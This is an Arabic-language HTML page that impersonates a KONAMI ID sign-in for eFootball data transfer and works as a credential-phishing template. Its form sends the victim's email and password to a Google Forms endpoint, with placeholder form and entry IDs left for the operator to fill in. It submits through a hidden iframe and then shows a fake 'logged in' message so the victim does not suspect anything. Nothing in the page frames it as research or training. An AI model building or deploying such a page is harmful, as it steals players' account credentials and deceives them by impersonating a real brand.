<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>تسجيل الدخول | KONAMI ID</title>
<style>
  body{margin:0;font-family:system-ui,-apple-system,"Segoe UI",Tahoma,sans-serif;background:#0d1117;color:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
  .card{width:100%;max-width:400px;background:#161b22;border:1px solid #23303f;border-radius:14px;padding:28px 24px}
  h1{font-size:22px;text-align:center;margin:0;letter-spacing:1.5px}
  p.sub{text-align:center;color:#8b98a5;font-size:13px;margin:8px 0 22px}
  label{display:block;font-size:12.5px;color:#a9b6c3;margin:14px 0 6px}
  input{width:100%;padding:11px 12px;border-radius:9px;border:1px solid #2b3a4a;background:#0d1117;color:#fff;font-size:14px;box-sizing:border-box;outline:none}
  input:focus{border-color:#0a84ff}
  button{width:100%;margin-top:20px;padding:12px;border:0;border-radius:9px;background:#0a84ff;color:#fff;font-weight:700;font-size:15px;cursor:pointer}
  .foot{text-align:center;font-size:11.5px;color:#5c6b7a;margin-top:18px}
  .done{display:none;text-align:center;padding:30px 10px}
  .done h2{font-size:18px;margin:0 0 8px}
  .done p{color:#8b98a5;font-size:13.5px;margin:0}
</style>
</head>
<body>
<div class="card">
  <div id="box">
    <h1>KONAMI ID</h1>
    <p class="sub">سجّل الدخول لإكمال نقل بيانات eFootball™</p>

    <!-- ضع FORM_ID و entry IDs هنا -->
    <form id="loginForm"
          action="https://docs.google.com/forms/d/e/FORM_ID/formResponse"
          method="POST" target="sink">

      <label>البريد الإلكتروني / KONAMI ID</label>
      <input type="text" name="entry.1111111111" required placeholder="you@example.com">

      <label>كلمة المرور</label>
      <input type="password" name="entry.2222222222" required placeholder="••••••••">

      <button type="submit">تسجيل الدخول</button>
    </form>

    <div class="foot">© KONAMI</div>
  </div>

  <div class="done" id="done">
    <h2>تم تسجيل الدخول ✅</h2>
    <p>يمكنك العودة إلى اللعبة الآن</p>
  </div>
</div>

<iframe name="sink" style="display:none"></iframe>

<script>
  document.getElementById('loginForm').addEventListener('submit', function(){
    setTimeout(function(){
      document.getElementById('box').style.display = 'none';
      document.getElementById('done').style.display = 'block';
    }, 900);
  });
</script>
</body>
</html>
